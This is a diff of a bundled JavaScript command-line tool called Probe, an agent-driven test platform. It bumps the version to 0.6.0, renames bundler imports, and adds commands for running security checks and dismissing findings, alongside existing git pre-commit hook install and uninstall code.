       const staged = capture("git", ["diff", "--cached", "--name-only", "--diff-filter=ACMR"], project.root);
-      const files = (staged ?? "").split(/\r?\n/).filter(Boolean).map((f) => (0, import_node_path37.join)(project.root, f));
+      const files = (staged ?? "").split(/\r?\n/).filter(Boolean).map((f) => (0, import_node_path45.join)(project.root, f));
       if (files.length && markStale(project, files, "commit", session).length) await kickCheck(project, "commit");
       return 0;
     }
@@ -35322,19 +37158,19 @@ function parseClaudeInput(stdin) {
 function probeProject(cwd) {
   try {
     const project = openProject(cwd);
-    return (0, import_node_fs30.existsSync)((0, import_node_path37.join)(project.root, "probe")) ? project : null;
+    return (0, import_node_fs35.existsSync)((0, import_node_path45.join)(project.root, "probe")) ? project : null;
   } catch {
     return null;
   }
 }
 function readStdin() {
-  return new Promise((resolve7) => {
-    if (process.stdin.isTTY) return resolve7("");
+  return new Promise((resolve9) => {
+    if (process.stdin.isTTY) return resolve9("");
     let data = "";
     process.stdin.setEncoding("utf8");
     process.stdin.on("data", (c) => data += c);
-    process.stdin.on("end", () => resolve7(data));
-    process.stdin.on("error", () => resolve7(data));
+    process.stdin.on("end", () => resolve9(data));
+    process.stdin.on("error", () => resolve9(data));
   });
 }
 var BEGIN = "# >>> probe (probe hooks install)";
@@ -35370,24 +37206,24 @@ function withoutPreCommitBlock(text2) {
 function gitHooks(project, action) {
   const dir = capture("git", ["rev-parse", "--git-path", "hooks"], project.root);
   if (!dir) throw new Error("Not a git repository: the pre-commit hook needs git.");
-  const file = (0, import_node_path37.resolve)(project.root, dir, "pre-commit");
-  const existing = (0, import_node_fs30.existsSync)(file) ? (0, import_node_fs30.readFileSync)(file, "utf8") : null;
+  const file = (0, import_node_path45.resolve)(project.root, dir, "pre-commit");
+  const existing = (0, import_node_fs35.existsSync)(file) ? (0, import_node_fs35.readFileSync)(file, "utf8") : null;
   const installed = existing?.includes(BEGIN) ?? false;
   if (action === "install") {
-    (0, import_node_fs30.mkdirSync)((0, import_node_path37.dirname)(file), { recursive: true });
-    (0, import_node_fs30.writeFileSync)(file, withPreCommitBlock(existing, preCommitBlock((0, import_node_path37.resolve)(process.argv[1]))), { mode: 493 });
+    (0, import_node_fs35.mkdirSync)((0, import_node_path45.dirname)(file), { recursive: true });
+    (0, import_node_fs35.writeFileSync)(file, withPreCommitBlock(existing, preCommitBlock((0, import_node_path45.resolve)(process.argv[1]))), { mode: 493 });
     return `${installed ? "Updated" : "Installed"} Probe's block in ${file}. Each commit now marks the staged files' features stale and starts a check in the background.`;
   }
   if (action === "uninstall") {
     if (!installed) return `No Probe block in ${file}.`;
-    (0, import_node_fs30.writeFileSync)(file, withoutPreCommitBlock(existing));
+    (0, import_node_fs35.writeFileSync)(file, withoutPreCommitBlock(existing));
     return `Removed Probe's block from ${file}.`;
   }
   return installed ? `Installed in ${file}.` : `Not installed (probe hooks install adds it to ${file}).`;
 }
 
 // src/cli.ts
-var VERSION = "0.5.0";
+var VERSION = "0.6.0";
 var HELP = `probe ${VERSION} \u2014 agent-driven test platform
 
 Usage: probe <command> [options]
@@ -35416,6 +37252,10 @@ Usage: probe <command> [options]
   issues <run>           Problems a run found, each with an id
   fix-prompt <issue>     A prompt for fixing one issue, for any coding agent
   fix <issue>            An agent fixes the issue in the code, then Probe re-checks it
+  security [feature]     Security checks for the project's platforms (rules, dependencies, history,
+                         the built app, the running app); --agent adds an agent code review,
+                         --layers static,deps,\u2026 picks layers, --url http://localhost:3000 checks the running app
+  security-dismiss <issue> <reason>  Not an issue here: hide a security finding, with the reason
   ticket <id>            Commits, features and cards of a ticket
   ticket draft <run>     A ticket draft for a run that did not pass
   ticket file <run>      File it with tickets.fileCommand from probe.yaml
@@ -35466,7 +37306,9 @@ async function main(argv) {
   const triggerArg = opt("--trigger");
   const stepArg = opt("--step");
   const sessionArg = opt("--session");
-  const flags = /* @__PURE__ */ new Set(["--no-open", "--detail", "--code", "--no-device", "--all-cards", "--outdated", "--rerun-fresh", "--no-drafts", "--run", "--yes", "--status"]);
+  const layersArg = opt("--layers");
+  const urlArg = opt("--url");
+  const flags = /* @__PURE__ */ new Set(["--no-open", "--detail", "--code", "--no-device", "--all-cards", "--outdated", "--rerun-fresh", "--no-drafts", "--run", "--yes", "--status", "--agent"]);
   const runFlag = argv.includes("--run");
   const noDrafts = argv.includes("--no-drafts");
   const outdated = argv.includes("--outdated");
@@ -35594,9 +37436,9 @@ ${rows.join("\n")}` : "No results recorded yet.");
     case "fix-prompt": {
       if (!arg) return usage("probe fix-prompt <issue>");
       const project = openProject(projectArg);
-      const found = findIssue(project, arg);
-      if (!found) return usage(`probe fix-prompt <issue>  (no issue ${arg}; see probe issues <run>)`);
-      console.log(fixPrompt(project, found.issue, found.run, false));
+      const found3 = findIssue(project, arg);
+      if (!found3) return usage(`probe fix-prompt <issue>  (no issue ${arg}; see probe issues <run>)`);
+      console.log(fixPrompt(project, found3.issue, found3.run, false));
       return 0;
     }
     case "fix": {
@@ -35607,6 +37449,24 @@ ${rows.join("\n")}` : "No results recorded yet.");
       console.log(`
 ${summarizeFix(finished)}`);
       return finished.status === "passed" ? 0 : 1;
+    }
+    case "security": {
+      const layers = layersArg?.split(",").map((l) => l.trim()).filter(Boolean);
+      const bad = layers?.filter((l) => !ALL_LAYERS.includes(l));
+      if (bad?.length) return usage(`probe security [feature] [--agent] [--layers ${ALL_LAYERS.join(",")}] [--url <local url>]  (unknown layer ${bad.join(", ")})`);
+      const { run, done } = startSecurityRun(openProject(projectArg), { feature: arg, layers, agent: argv.includes("--agent"), url: urlArg, model, agentLimit: limitArg ? Number(limitArg) : void 0 });
+      follow(run.id);
+      const finished = await done;
+      console.log(`
+${summarizeSecurity(finished)}`);
+      return finished.status === "passed" ? 0 : 1;
+    }
+    case "security-dismiss": {
+      if (!arg || !arg2) return usage('probe security-dismiss <issue> "<why it is not an issue>"');
+      const reason = argv.slice(argv.indexOf(arg2)).join(" ");
+      const d = dismissIssue(openProject(projectArg), arg, reason);
+      console.log(`Dismissed ${d.check}${d.file ? ` in ${d.file}` : ""}: ${d.reason}`);
+      return 0;
     }
     case "explore": {
       if (!arg) return usage("probe explore <feature> [--device <serial>]");
@@ -35674,7 +37534,7 @@ Cards: ${info.cards.join(", ") || "none"}`);
       const project = openProject(projectArg);
       const targets = arg ?? (ticketArg ? ticketInfo(project, ticketArg).features : void 0);
       if (!targets || Array.isArray(targets) && targets.length === 0) return usage("probe backfill <feature|*> [--ticket <id> [--ticket-text <file>]]");
-      const ticket = ticketArg ? { id: ticketArg, text: ticketTextArg ? (0, import_node_fs31.readFileSync)(ticketTextArg, "utf8") : void 0 } : void 0;
+      const ticket = ticketArg ? { id: ticketArg, text: ticketTextArg ? (0, import_node_fs36.readFileSync)(ticketTextArg, "utf8") : void 0 } : void 0;
       const { run, done } = startBackfill(project, targets, { model, ticket });
       follow(run.id);
       const finished = await done;
@@ -35800,13 +37660,13 @@ ${summarizeCheckRun(finished)}`);
     case "rule": {
       if (!arg) return usage("probe rule <feature/rule> [--run] [--device <serial>]");
       const project = openProject(projectArg);
-      const found = findRule(project, arg);
-      if ("error" in found) {
-        console.log(found.error);
+      const found3 = findRule(project, arg);
+      if ("error" in found3) {
+        console.log(found3.error);
         return 1;
       }
       if (!runFlag) {
-        console.log(summarizeRule(ruleProofs(project, found.manifest).find((p) => p.invariant.id === found.invariant.id)));
+        console.log(summarizeRule(ruleProofs(project, found3.manifest).find((p) => p.invariant.id === found3.invariant.id)));
         return 0;
       }
       const result = await runRuleCards(project, arg, { device: deviceArg, model, log: (l) => console.log(l) });
@@ -35870,7 +37730,7 @@ async function readSecret(promptText) {
   process.stdout.write(promptText);
   stdin.setRawMode(true);
   stdin.resume();
-  return new Promise((resolve7) => {
+  return new Promise((resolve9) => {
     let value = "";
     const onData = (buf) => {
       for (const ch of buf.toString("utf8")) {
@@ -35879,7 +37739,7 @@ async function readSecret(promptText) {
           stdin.pause();
           stdin.off("data", onData);
           process.stdout.write("\n");
-          resolve7(value);
+          resolve9(value);
           return;
         }
         if (ch === "") process.exit(130);
